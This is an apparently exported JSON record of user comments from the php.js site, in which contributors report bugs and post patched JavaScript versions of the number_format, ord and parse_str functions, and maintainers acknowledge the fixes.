1000 before it ran through the function.  Duh, sorry.\r\n\r\nLove the script!\r\nChad"},{"date":"2008-11-04 13:05:26","author":"Mariusz","url":"","comment":"This method does not seem to work correctly with negative numbers, for example (to 2 decimal places):\r\n\r\n-16038 returns: -160,38.00\r\n\r\n-820 returns -,820.00"},{"date":"2008-11-04 13:09:18","author":"Mariusz","url":"","comment":"I take it back, got the latest version and all looks good.  Thanks to those involved with the fixes!"},{"date":"2009-01-14 09:21:56","author":"Cees","url":"http:\/\/www.connectcase.nl","comment":"This was so what I was looking for!!! Thanks, guys!!!"},{"date":"2009-01-15 19:45:18","author":"Memiux","url":"http:\/\/memiux.com","comment":"Thanks, It's so beautiful and tiny :)"},{"date":"2009-01-16 09:31:46","author":"Luke","url":"http:\/\/lucassmith.name","comment":"I attacked the same problem recently and came up with a similar solution\r\nhttp:\/\/gist.github.com\/47871\r\n\r\nmore lines, but fewer characters, and compresses (via YUI Compressor) to about 83% of the version above.  Take a look; there may be improvements to be made."},{"date":"2009-01-16 22:49:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Luke: After I changed:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nprec = !isFinite(+prec) ? 2 : Math.abs(prec);\r\n[\/CODE]\r\n\r\nTo \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nprec = !isFinite(+prec) ? 0 : Math.abs(prec);\r\n[\/CODE]\r\n\r\n..All test cases from the php manual worked perfectly. And since your code is a bit easier on the eyes as well, I'll include it in our project. Thanks a lot!"},{"date":"2009-02-02 16:55:53","author":"Diogo Resende","url":"http:\/\/www.thinkdigital.pt","comment":"It's not correct for numbers below 1000. It needs an else statement like this:\r\n[CODE=&quot;Javascript&quot;]\r\nif (abs &gt; 1000) {\r\n...\r\n} else {\r\n\ts = abs.replace('.', ',');\r\n}\r\n[\/CODE]"},{"date":"2009-02-02 16:57:38","author":"Simon","url":"n\/a","comment":"This does not work as is on IE6 and IE7, very simple to fix.\n\nsearch \n   is not defined and ie throws an error.\n\nso just add\nvar search; \nto the top of the script."},{"date":"2009-02-02 23:40:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Diogo Resende: Confirmed. I've processed your fix. Thanks a lot!"},{"date":"2009-02-12 10:15:34","author":"Rival","url":"","comment":"- show thousand separator for number=1000\r\n- decimal point for numbers lower than 1000 is undefined\r\n\r\nnote: for 1000.55 result with precision 1 in FF\/Opera is 1,000.5, but in IE is 1,000.6\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction number_format(number, decimals, dec_point, thousands_sep) {\r\n    var n = number, prec = decimals;\r\n    n = !isFinite(+n) ? 0 : +n;\r\n    prec = !isFinite(+prec) ? 0 : Math.abs(prec);\r\n    var sep = (typeof thousands_sep == &quot;undefined&quot;) ? ',' : thousands_sep;\r\n    var dec = (typeof dec_point == &quot;undefined&quot;) ? '.' : dec_point;\r\n\r\n    var s = (prec &gt; 0) ? n.toFixed(prec) : Math.round(n).toFixed(prec); \/\/fix for IE parseFloat(0.55).toFixed(0) = 0;\r\n\r\n    var abs = Math.abs(n).toFixed(prec);\r\n    var _, i;\r\n\r\n    if (abs &gt;= 1000) {\r\n        _ = abs.split(\/\\D\/);\r\n        i = _[0].length % 3 || 3;\r\n \r\n        _[0] = s.slice(0,i + (n &lt; 0)) +\r\n              _[0].slice(i).replace(\/(\\d{3})\/g, sep+'$1');\r\n \r\n        s = _.join(dec);\r\n    } else {\r\n        s = s.replace('.', dec);\r\n    }\r\n \r\n    return s;\r\n}\r\n[\/CODE]"},{"date":"2009-02-12 10:31:11","author":"Rival","url":"","comment":"cleanup\r\n[CODE=&quot;Javascript&quot;]\r\n....\r\n    var abs = Math.abs(s);\r\n....\r\n[\/CODE]"},{"date":"2009-02-15 15:23:33","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rival: Hey there, excellent work Rival! I've also added 2 test cases that cover your findings so we can't make that mistake again. Thanks!"},{"date":"2009-05-22 16:32:30","author":"Kheang Hok Chin","url":"www.distantia.ca","comment":"Hi, I have a question in regard to this comment: \r\n- bugfix by: Rival \r\nnote 1: For 1000.55 result with precision 1 in FF\/Opera is 1,000.5, but in IE is 1,000.6\r\n\r\nHas this been fixed or does this mean that if a user using Firefox, Opera, Safari will always get the result 1000.5 when formatting the number 1000.55 to precision 1? \r\n\r\nWhile in IE it returns 1000.6 which is correct as number_format in PHP works the same way.\r\n\r\nIs there a fix for this?"},{"date":"2009-05-25 13:28:42","author":"davook","url":"","comment":"Related to the last comment, i've the same problem.\r\n\r\nIt seems that \"toFixed()\" is the problem:\r\nhttp:\/\/forums.mozillazine.org\/viewtopic.php?f=9&t=99994\r\n\r\nAs a temporary, bad and ugly solution i'm using an auxiliar function replacing toFixed().\r\n\r\nExample:\r\n[CODE]\r\n\/\/ Original code\r\nn.toFixed(prec);\r\n\r\n\/\/ New code\r\ntoFixedFix(n, prec);\r\n[\/CODE]\r\n\r\nThe toFixedFix function would be like this:\r\n[CODE]\r\nfunction toFixedFix(n,prec) {\r\n  var k = Math.pow(10,prec);\r\n  return (Math.round(n*k)\/k).toString();\r\n}\r\n[\/CODE]\r\n\r\nAny idea how improve it?"},{"date":"2009-06-01 11:19:21","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Kheang Hok Chin, thanks for the report and @davook, thanks for the workaround! I've incorporated the workaround (and added some more test cases), and also fixed a problem when the final value was an absolute number and was thus not getting zeroes added. (FYI, the referenced discussion thread was missing a digit at the end: http:\/\/forums.mozillazine.org\/viewtopic.php?f=9&t=999945 )"},{"date":"2009-06-11 17:45:25","author":"Jay Klehr","url":"","comment":"When using number_format to format numbers used for currency, I noticed that if the number has a single decimal followed by a zero initially, and I apply number_format to it (with 2 decimal precision) I don't get 2 decimals. It strips the trailing zero.\n\n[code]\nnumber_format('1.20', 2); \/\/ returns 1.2, should return 1.20\n[\/code]\n\nUsing the above version as of this writing (906.111)"},{"date":"2009-06-18 06:42:58","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Thanks for the report, Jay. Should be fixed now."},{"date":"2009-06-18 13:59:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Thanks for fixing Brett!!"},{"date":"2009-06-18 21:59:55","author":"Amir Habibi","url":"http:\/\/www.residence-mixte.com\/","comment":"To continu with Jay's comment, if you try :\n\n[CODE]\nnumber_format('1.2', 2);\n[\/CODE]\n\nYou'll still get '1.2' instead of '1.20'"},{"date":"2009-06-19 00:07:40","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, great, thanks Amir. Fixed and tested (Mozilla). (Also allowed precision 1 to work in all cases.)"},{"date":"2009-06-19 17:40:55","author":"Jay Klehr","url":"","comment":"Thanks Brett, looks good now."},{"date":"2009-10-10 20:24:25","author":"Andras","url":"","comment":"This is shorter :) Feel free to change var names.\n[CODE]\nfunction number_format(amount, nDec, sDec, sTho){\n\tif (!sDec) sDec = ',';\n\tif (!sTho) sTho = '.';\n\tamount = (amount * 1).toFixed(nDec);\n\tif (isNaN(amount)) return NaN;\n\tamountExp = (amount + '').split('.');\n\tamount = amountExp[0];\n\tvar rgx = \/(\\d+)(\\d{3})\/;\n\twhile (rgx.test(amount)) {\n\t\tamount = amount.replace(rgx,'$1' + sTho + '$2');\n\t};\n\tif (nDec > 0){\n\t\tamount += sDec + amountExp[1];\n\t};\n\treturn amount;\n};\n[\/CODE]\n"},{"date":"2009-10-10 23:47:44","author":"Josh","url":"","comment":"Thank you for the function, however it boggles my mind that you can go through 906 revisions and still can't get negative numbers right (at least in Firefox 3.5.3 or IE 8). Negative numbers are numbers that are less than 0, and yes, they do come into play occasionally in this world. I added a couple changes at the very beginning and end of the function to account for the problem:\n\n[CODE]\n\/\/beginning\nvar prefix = '';\nif(number < 0)\n prefix = '-';\n\n\/\/end\nreturn prefix + s; "},{"date":"2009-10-11 07:26:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Josh: Although I don't know what Kevin's system of numbering is about exactly, I'm pretty darn sure it wasn't 900 revisions! Please keep in mind that these functions have been posted here by different people, often with submissions which started as mere approximations of the PHP function and over time have had a few bugs fixed, some more PHP behaviors added, etc. Not all of us have the time or experience to review each function in full detail, compare it with PHP behavior and its idiosyncrasies, etc. (and functions earlier on were accepted with more loose standards than now). A lot of functions were added in good faith. We're volunteers just like you are in submitting the patch, only Kevin has done the added work of making a website, a compiler, etc., just in the hopes of it being useful. So, take it or leave it for what it's worth. We'd all love to see a comprehensive review and have the functions put through all of the test cases as used in the PHP source code, but we're not there yet. I think maybe the Duct Tape Programmer philosophy applies to our project: http:\/\/www.joelonsoftware.com\/items\/2009\/09\/23.html  :)\n\n@Andras, Thanks very much for the function.  Before Kevin or I get a chance to look at it, could you be sure that it follows the PHP behavior at least as well as the one we have now--passing test cases, etc. and addressing Josh's issue?"},{"date":"2009-10-25 13:37:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Josh: as you can see this function has been revised 2 times. That means a complete rewrite. I guess what you could blame us for is regression. More specifically: not having a test case for the negative numbers.\nBut hey, there are over 400 functions we have to maintain and we do all of this for free so please take it or by all means - leave it.\n\n@ Brett Zamir: I chose not to have an incremental version for each function because I felt that could easily lead to inconsistency. Instead it's the shortest form of the modification date that still makes sense.\ne.g.: 906.1806 would translate to 20090618 06:00:00\n"},{"date":"2010-01-02 15:31:18","author":"Robert","url":"","comment":"thank you! You just made my life 20 times easier. "},{"date":"2010-01-07 21:34:44","author":"Ronnie","url":"","comment":"I like it, but now I have to calculation on it, so I need to format the number back to a numeric format for example\n\nfrom \n1,000,235.22\n\nto \n1000235.22\n"},{"date":"2010-01-08 04:17:45","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ronnie: We're really just focused here on implementing the already-existing API of PHP, and PHP doesn't have any formal way of converting back to a numeric format. Why don't you just transmit both forms together within your application? Or are you depending on user input which may include use of commas, etc.?\n\nIf the latter, you might be able to use this:\n\n[CODE]function strtonumber( str, dec_point, thousands_sep ) {\n    \/\/ +   based on: http:\/\/www.php.net\/manual\/en\/function.number-format.php#76448\n    \/\/ +      adapted by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ -    depends on: localeconv\n    \/\/ -    depends on: str_replace\n    \/\/ *     example 1: strtonumber('1,123.564', '.', ',');\n    \/\/ *     returns 1: 1123.564\n    \/\/ *     example 2: strtonumber('1,123', '.', ',')\n    \/\/ *     returns 2: 1123\n\n    if(typeof dec_point === 'undefined' || typeof thousands_sep === 'undefined') {\n        var locale = this.localeconv();\n        if(typeof dec_point === 'undefined') {\n            dec_point = locale['decimal_point'];\n        }\n        if(typeof thousands_sep === 'undefined') {\n            thousands_sep = locale['thousands_sep'];\n        }\n    }\n    return parseFloat(this.str_replace(dec_point, '.', this.str_replace(thousands_sep, '', str)));\n}\n[\/CODE]\n\nI was able to avoid the extra code used in the original (at the end) since JavaScript doesn't represent integers differently from floats as variable types.\n\nBe sure to add the dependencies and also note that localeconv() also has its own dependency of setlocale() which you also will need, at least if you may rely on defaults.\n\nBut consider that the default locale set up by setlocale() was based on the default locale I obtained in my own testing which did not include a thousands separator (as one might expect the default to be ',' as English). So, unless you adapt the locale(s) inside setlocale(), you have to specify all of the arguments for strtonumber.\n\nHope that helps..."},{"date":"2010-04-24 16:51:00","author":"Graci Granados","url":"","comment":"Thanks Brother, congratulation!!!"},{"date":"2010-06-01 09:11:17","author":null,"url":"http:\/\/www.gestiondecompras.com","comment":"Hi guys,\n\nI think that I found a bug because I get 555,42 in that function number_format(555.425, 2, ',', '.') when the result could be 555,43\n\nAny solution?\n\nThanks.\n\nSorry for my english"},{"date":"2010-06-01 12:26:32","author":null,"url":"http:\/\/www.gestiondecompras.com","comment":"One posible solution. Add\n[CODE]\nvar ajuste = n + 1\/(k*10);\n[\/CODE]\nand replace the return value for this:\n[CODE]\nreturn '' + Math.round(ajuste * k) \/ k;\n[\/CODE]\nin the function toFixedFix declared over the line 50, leave it something like that:\n[CODE]\ntoFixedFix = function (n, prec) {\n            var k = Math.pow(10, prec);\n            var ajuste = n + 1\/(k*10);\n            return '' + Math.round(ajuste * k) \/ k;\n        };\n[\/CODE]\n\nAny suggestion??"},{"date":"2010-06-01 16:13:54","author":null,"url":"http:\/\/www.gestiondecompras.com","comment":"OK, I\u00b4m wrong, because, in PHP, the result gives us 555,42 to in number_format(555.425, 2, ',', '.').\n\nI was looking a solution to round like excel.\n\nAnyway my \"solution\" works fine for \"excel\u00b4s round\".\n\nGreets."},{"date":"2010-06-19 16:25:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafael Mart\u00ednez: Thanks for taking the time to investigate further. Appreciated\n"},{"date":"2010-07-28 14:47:56","author":"Amirouche","url":"","comment":"I can't have this:\nnumber_en = number_format(1 000,50, 2, '.', ' ');\n\nresult:\n\nnumber_en = 1000.50"},{"date":"2010-09-08 16:45:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Amirouche: Fixed: https:\/\/github.com\/kvz\/phpjs\/commit\/3f791fd7fa196ba6a1db6c67c6e8c6f24fc0659b\n"},{"date":"2010-12-15 03:48:41","author":"WoofWoof","url":"woofwoof75.com","comment":"Nice one!\n\nBut I have problem when there's 1,000,000.00... it'll return 0, it is unable to handle such a big sum? only 1000,000.00? I'm relying on this to format $$$... but when dealing with Indonesian Rupiah... which usually of very huge sum."},{"date":"2010-12-15 05:39:34","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@WoofWoof: It does look like a bug. I'm a little busy at the moment unless someone else can help, but in the meantime, you might try money_format() as it can handle larger numbers."},{"date":"2010-12-22 00:43:46","author":"bmw sports","url":"http:\/\/motorimpress.com\/bmw","comment":"This codes makes me dizzy :)"},{"date":"2011-02-24 12:34:02","author":"motor","url":"http:\/\/www.motor.es","comment":"Very well. Thanks you."},{"date":"2011-03-04 02:15:46","author":"Theriault","url":"","comment":"@WoofWoof: This bug should now be fixed. The new source is available on GitHub, or https:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/strings\/number_format.js"},{"date":"2011-08-02 16:48:23","author":"Fabricio","url":"","comment":"\u00d3timo, foi de grande utilidade, alias, todas as fun\u00e7\u00f5es s\u00e3o \u00fateis."},{"date":"2011-08-31 17:25:22","author":"Sebastian Haller","url":"","comment":"number_format(-5.5) returns -6 in PHP (because PHP rounds half numbers up = away from zero, while JavaScript rounds them always up). Hence I suggest changing line 66 to\n\n[CODE]\ns = ((n<0 ? '-' : '') + (prec ? toFixedFix(Math.abs(n), prec) : '' + Math.round(Math.abs(n)))).split('.');\n[\/CODE]\n\nand adding example 14:\n\n[CODE]\n\/\/ *    example 14: number_format('-5.5');\n\/\/ *    returns 14: '-6'\n[\/CODE]"},{"date":"2011-08-31 19:46:54","author":"Sebastian Haller","url":"","comment":"Sorry, my fix did not work, it should be\n\n[CODE]s = (prec ? toFixedFix(Math.abs(n), prec) : '' + Math.round(Math.abs(n))).split('.');[\/CODE]\n\nand\n\n[CODE]return (n<0 ? '-' : '')+s.join(dec);[\/CODE]\n"},{"date":"2011-09-28 01:29:13","author":"Memo","url":"","comment":"Me salvo la vida xD\nThis save my life xD"},{"date":"2011-09-29 09:40:56","author":"Koon","url":"-","comment":"Thank you so mush !!"},{"date":"2012-01-07 22:28:41","author":"Nima","url":"","comment":"Thanks , grate job ;)"},{"date":"2012-07-10 21:19:07","author":"Haider Abbas","url":"http:\/\/hitbiz.net","comment":"Thanks a lot! Works just like PHP equivalent. Perfect work. Very helpful."},{"date":"2012-07-17 06:36:10","author":"Vishwa","url":"","comment":"Thanks.\nWorks like a charm."},{"date":"2012-09-27 20:43:52","author":"Daniel","url":"","comment":"how add a hundred separator?\n"}],"ord":[{"date":"2008-07-31 13:58:01","author":"ToshaUst","url":"","comment":"[CODE=&quot;Javascript&quot;]\r\nfunction ord( string , inHex) \r\n{ \r\n\tvar code = string.charCodeAt(0);\r\n    if(inHex)\r\n    {\r\n    \tvar ar = ['A','B','C','D','E','F'],f,s;\r\n    \tf = Math.floor(code\/16);\r\n    \tif(f &gt; 9) f = ar[f-10];\r\n    \ts = code % 16;\r\n    \tif(s &gt; 9) s = ar[s-10];\r\n    \tcode = f+s;\r\n    }\r\n    return code;\r\n}\r\n[\/CODE]"},{"date":"2008-08-27 16:49:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ ToshaUst: Thanks for your code! However I don't believe that PHP supports a second argument. What are the use cases? Based on those we can choose to stray from our policy, not to extend function with custom ideas."},{"date":"2009-05-13 21:16:23","author":"Ole Vrijenhoek","url":"","comment":"Hey,\nI don't if it is the intention to similate this function,\nso it does the exact same thing as php's.\nBut charCodeAt() returns the unicode or ascii and ord() only does the ascii."},{"date":"2009-05-14 01:19:33","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Ole, three bits of good news here...\n\nOne, PHP6 is scheduled to have these work with Unicode: http:\/\/lxr.php.net\/source\/php-src\/ext\/standard\/string.c#3641 and http:\/\/lxr.php.net\/source\/php-src\/ext\/standard\/string.c#3621\n\nTwo, it'd be pretty strange to use chr()\/ord(), expecting both correct behavior for ASCII (which is reasonable) while also expecting some _specific_ non-Unicode behavior for non-ASCII. While PHP's chr\/ord functions before version 6 don't work with Unicode, it does work with ASCII for which it was designed, and these values are the same in both systems (though requiring 2 bytes in Unicode UTF-16 as JavaScript uses internally--though this does not change the behavior of fromCharCode\/charCodeAt which work with single 2-byte sequences, not one-byte ones). So, the functions (ours and PHP's) will continue to work fine with ASCII. Just don't go using these functions with Unicode in PHP4 or PHP5. But the fact that they don't work in PHP4 and PHP5 is due to a bug which is now corrected in PHP6.\n\n3) I updated chr() and ord() to work with all Unicode characters, including those rarer ones beyond the Basic Multi-lingual Plane (BMP)."},{"date":"2011-01-23 13:45:36","author":"incidence","url":"","comment":"Please explain this empty if\n[CODE]\n        var low = str.charCodeAt(1);\n        if (!low) {\n            \n        }\n[\/CODE]\n\nThanks!"},{"date":"2011-01-24 04:50:48","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@incidence: Thanks for the report! Fixed in Git. I think I was going to use the \"if\" code until I realized \"if (str.length === 1) { return code;}\" would do the trick (and I just forgot to remove the subsequent dead code). "},{"date":"2012-04-18 10:21:17","author":"???? ????????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"parse_str":[{"date":"2008-03-02 22:00:39","author":"Michael White","url":"","comment":"This function did not take into account the fact that the URL string might be encoded so I modified it to handle encoded URLs and added a new example.\r\n\r\n\r\n[CODE=&quot;JavaScript&quot;]\r\nfunction parse_str(str, array){\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Cagri Ekin\r\n    \/\/ *     example 1: parse_str('first=foo&amp;second=bar');\r\n    \/\/ *     returns 1: { first: 'foo', second: 'bar' }\r\n\t\/\/ *     example 2: parse_str('str_a=Jack+and+Jill+didn%27t+see+the+well.');\r\n\t\/\/ *     returns 2: { str_a: &quot;Jack and Jill didn't see the well.&quot; }\r\n \r\n    var glue1 = '=';\r\n    var glue2 = '&amp;';\r\n \r\n    var array2 = str.split(glue2);\r\n    var array3 = [];\r\n    for(var x=0; x&lt;array2.length; x++){\r\n        var tmp = array2[x].split(glue1);\r\n        array3[unescape(tmp[0])] = unescape(tmp[1]).replace(\/[+]\/g, ' '); \/\/ This is the modified line.\r\n    }\r\n \r\n    if(array){\r\n        array = array3;\r\n    } else {\r\n        return array3;\r\n    }\r\n}\r\n[\/CODE]\r\n\r\nhttp:\/\/crestidg.com"},{"date":"2008-03-03 11:47:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Michael White: great! thank you!"},{"date":"2009-04-27 21:13:29","author":"stag019","url":"","comment":"I couldn't think of a way to do it without eval(), but it better emulates PHP.\r\n[CODE]\r\nfunction parse_str(str, array)\r\n{\r\n\tvar glue1 = '=', glue2 = '&', array2 = String(str).split(glue2),\r\n\ti, j, tmp, key, value, bracket, keys, evalStr,\r\n\tfixStr = function(str)\r\n\t{\r\n\t\treturn urldecode(str).replace(\/([\\\\\"'])\/g, '\\\\$1').replace(\/\\0\/g, '\\\\0').replace(\/\\n\/g, '\\\\n').replace(\/\\r\/g, '\\\\r');\r\n\t};\r\n\r\n\tif(!array)\r\n\t{\r\n\t\tarray = window;\r\n\t}\r\n\r\n\tfor(i = 0; i < array2.length; i++)\r\n\t{\r\n\t\ttmp = array2[i].split(glue1);\r\n\t\tif(tmp.length < 2)\r\n\t\t{\r\n\t\t\ttmp = [tmp, ''];\r\n\t\t}\r\n\t\tkey   = fixStr(tmp[0]);\r\n\t\tvalue = fixStr(tmp[1]);\r\n\t\twhile(key.charAt(0) == ' ')\r\n\t\t{\r\n\t\t\tkey = key.substr(1);\r\n\t\t}\r\n\t\tif(key && key.charAt(0) != '[')\r\n\t\t{\r\n\t\t\tkeys    = [];\r\n\t\t\tbracket = 0;\r\n\t\t\tfor(j = 0; j < key.length; j++)\r\n\t\t\t{\r\n\t\t\t\tif(key.charAt(j) == '[' && !bracket)\r\n\t\t\t\t{\r\n\t\t\t\t\tbracket = j + 1;\r\n\t\t\t\t}\r\n\t\t\t\telse if(key.charAt(j) == ']')\r\n\t\t\t\t{\r\n\t\t\t\t\tif(bracket)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tif(!keys.length)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tkeys.push(key.substr(0, bracket - 1));\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tkeys.push(key.substr(bracket, j - bracket));\r\n\t\t\t\t\t\tbracket = 0;\r\n\t\t\t\t\t\tif(key.charAt(j + 1) !== '[')\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(!keys.length)\r\n\t\t\t{\r\n\t\t\t\tkeys = [key];\r\n\t\t\t}\r\n\t\t\tfor(j = 0; j < keys[0].length; j++)\r\n\t\t\t{\r\n\t\t\t\tchr = keys[0].charAt(j);\r\n\t\t\t\tif(chr == ' ' || chr == '.' || chr == '[')\r\n\t\t\t\t{\r\n\t\t\t\t\tkeys[0] = keys[0].substr(0, j) + '_' + keys[0].substr(j + 1);\r\n\t\t\t\t}\r\n\t\t\t\tif(chr == '[')\r\n\t\t\t\t{\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tevalStr = 'array';\r\n\t\t\tfor(j = 0; j < keys.length; j++)\r\n\t\t\t{\r\n\t\t\t\tkey = keys[j];\r\n\t\t\t\tif((key !== '' && key !== ' ') || j === 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tkey = \"'\" + key + \"'\";\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tkey = eval(evalStr + '.push([]);') - 1;\r\n\t\t\t\t}\r\n\t\t\t\tevalStr += '[' + key + ']';\r\n\t\t\t\tif(j != keys.length - 1 && eval('typeof ' + evalStr) == 'undefined')\r\n\t\t\t\t{\r\n\t\t\t\t\teval(evalStr + ' = [];');\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tevalStr += \" = '\" + value + \"';\\n\";\r\n\t\t\teval(evalStr);\r\n\t\t}\r\n\t}\r\n}\r\n[\/CODE]"},{"date":"2009-04-29 15:25:02","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"stag019: Sorry but there are a lot function we need to maintain. Would it be possible for you to explain how your implementation beats our current one?"},{"date":"2009-04-30 00:35:16","author":"stag019","url":"","comment":"Sure, it parses strings such as array[key]=value into an array, in the same fashion PHP does. It also handles the encoding of the period and space characters, in the same fashion that PHP does."},{"date":"2009-04-30 00:52:06","author":"stag019","url":"","comment":"Oops, I also forgot to mention that the second parameter is now optional, as it uses the window variable if none is defined."},{"date":"2009-04-30 05:50:38","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Looks good, stag019, thanks! Added in SVN. (Netbeans just caught the fact that \"chr\" needed to be declared too.). If you like, you might also consider voting for https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=488227 as this is one behavior JS can't emulate from many PHP functions (in this case, we'd get a way to use parse_str() to put variables into a local scope only without using an array)."},{"date":"2009-05-02 22:07:03","author":"stag019","url":"","comment":"Well, time to bugfix myself. ;P\r\n\r\nLooking through the PHP source I realized I completely neglected to test anything with a null character in it. Aparently PHP completely ignores everything after a null character in the key name, but leaves it alone in the value.\r\n\r\nChange the function fixStr to [CODE]return urldecode(str).replace(\/([\\\\\"'])\/g, '\\\\$1').replace(\/\\n\/g, '\\\\n').replace(\/\\r\/g, '\\\\r');[\/CODE]\r\n\r\nUnderneath [CODE]\t\twhile(key.charAt(0) === ' ')\r\n\t\t{\r\n\t\t\tkey = key.substr(1);\r\n\t\t}[\/CODE] add [CODE]\t\tif(key.indexOf('\\0') !== -1)\r\n\t\t{\r\n\t\t\tkey = key.substr(0, key.indexOf('\\0'));\r\n\t\t}[\/CODE]"},{"date":"2009-05-02 22:31:29","author":"stag019","url":"","comment":"Two things I forgot to mention:\r\nDepends on urldecode now.\r\nSome places I use '==' or '!=' where I could probably use '===' or '!=='. These should probably be fixed."},{"date":"2009-05-03 03:12:03","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Thanks much, stag019... Fixed in SVN (including moving equality operators to identity ones)..."},{"date":"2010-05-15 13:55:26","author":"droope","url":"droope.wordpress.com","comment":"Hi.\n\nI keep getting \"i is not defined\". Perhaps something broke?\n\nRegards,\nDroope"},{"date":"2010-06-19 15:30:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ droope: Although there are plenty open jslint issues with this function, i is actually defined and in my tests it works. What platform are you experiencing issues on?"},{"date":"2010-08-15 16:10:15","author":"Dreamer","url":"","comment":"Bug report  --- \"TypeError: str.replace is not a function\" (Copied from FireBug)\n\n[CODE]\n\/\/ PHPJS cannot parse the following codes, while it's possible in PHP\nparse_str('&first=foo');\nparse_str('first=foo&');\nparse_str('&first=foo&');\n[\/CODE]"},{"date":"2010-08-16 03:55:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Dreamer: Fixed in Git. Thanks for the report!"},{"date":"2010-09-08 19:32:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Awesome"},{"date":"2010-09-13 18:03:00","author":"e-mike","url":"","comment":"The TypeError mentioned by Dreamer is still there (also in the git version).\n\nThe error is caused by urldecode (not parse_str). urldecode had a makeover not long ago and the error is since the makeover.\n\nIf the string (str) is empty, undefined or not a string you get this error."},{"date":"2010-09-14 05:55:39","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@e-mike. Thanks for the report. I had just assumed that was some cascading error that would be fixed by the fix I made, but now I've also addressed the urldecode issue you mention so the error should indeed now be avoided. (I'm just taking your word for it that PHP silently ignores missing, empty or null values, as I haven't confirmed in this case.) (I also just now simplified and expanded my earlier parse_str fix.)"},{"date":"2010-10-12 11:08:48","author":"Zaide","url":"zaidesthings.com","comment":"I was going to use this code then i saw the evals so i reimplemented it to this. Its faster, passes lint and its eval free :). I tested every make up of a query string i could think of and they all come out the same as the parse_str code above.\n[code]\nfunction parse_str_new (str, arr){\n\tvar strArr = (str+'').replace(\/^&\/, '').replace(\/&$\/, '').split('&'),\n\t\ti,\n\t\ttmp,\n\t\tkey,\n\t\tvalue,\n\t\tkeyIndex,\n\t\tsubkey,\n\t\tfixStr = function (str) {\n\t\t\treturn decodeURIComponent(str.replace(\/\\+\/g, '%20'));\n\t\t};\n\t\n\tif (!arr) {\n\t\tarr = this.window;\n\t}\n\t\n\tfor (i = 0; i < strArr.length; i++) {\n\t\ttmp = strArr[i].split(\"=\");\n\t\tkey = fixStr(tmp[0]);\n\t\tif(tmp.length < 2){\n\t\t\tvalue = \"\";\n\t\t}else{\n\t\t\tvalue = fixStr(tmp[1]);\n\t\t}\n\t\twhile (key.charAt(0) === ' ') {\n\t\t\tkey = key.substr(1);\n\t\t}\n\t\tif (key.indexOf(\"\\x00\") !== -1) {\n\t\t\tkey = key.substr(0, key.indexOf(\"\\x00\"));\n\t\t}\n\t\tif (key && key.charAt(0) !== '[') {\n\t\t\tkeyIndex = key.indexOf('[');\n\t\t\tif(keyIndex !== -1&&key.indexOf(']',keyIndex) !== -1){\n\t\t\t\tsubkey = key.substring(keyIndex+1,key.indexOf(']',keyIndex));\n\t\t\t\tkey = key.substring(0,keyIndex).replace(\/\\.| \/g,'_');\n\t\t\t\tif(!arr[key]){\n\t\t\t\t\tarr[key]=[];\n\t\t\t\t}\n\t\t\t\tif(subkey === \"\"){\n\t\t\t\t\tarr[key].push(value);\n\t\t\t\t}else{\n\t\t\t\t\tarr[key][subkey]=value;\n\t\t\t\t}\n\t\t\t}else{\n\t\t\t\tarr[key.replace(\/\\.| |\\[\/g,\"_\")] = value;\n\t\t\t}\n\t\t}\n\t}\n}\n[\/code]"},{"date":"2010-11-17 10:08:47","author":"Matteo","url":"","comment":"using the function as described above, this 